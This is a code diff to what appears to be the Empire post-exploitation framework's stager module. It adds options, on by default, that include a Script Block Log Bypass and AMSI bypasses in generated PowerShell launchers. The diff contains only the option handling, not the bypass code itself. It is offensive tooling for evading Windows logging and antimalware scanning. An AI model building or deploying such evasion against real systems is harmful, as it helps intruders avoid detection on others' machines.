@@ -45,6 +45,21 @@ class Stager:
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
+            },
+            'ScriptLogBypass' : {
+                'Description'   :   'Include cobbr\'s Script Block Log Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'True'
+            },
+            'AMSIBypass' : {
+                'Description'   :   'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'True'
+            },
+            'AMSIBypass2' : {
+                'Description'   :   'Include rastamouse\'s AMSI Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'False'
             }
         }
 
@@ -65,9 +80,24 @@ class Stager:
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
+        scriptLogBypass = self.options['ScriptLogBypass']['Value']
+        AMSIBypass = self.options['AMSIBypass']['Value']
+        AMSIBypass2 = self.options['AMSIBypass2']['Value']
+
+        scriptLogBypassBool = False
+        if scriptLogBypass.lower() == "true":
+            scriptLogBypassBool = True
+
+        AMSIBypassBool = False
+        if AMSIBypass.lower() == "true":
+            AMSIBypassBool = True
+
+        AMSIBypass2Bool = False
+        if AMSIBypass2.lower() == "true":
+            AMSIBypass2Bool = True
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks, scriptLogBypass=scriptLogBypassBool, AMSIBypass=AMSIBypassBool, AMSIBypass2=AMSIBypass2Bool)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
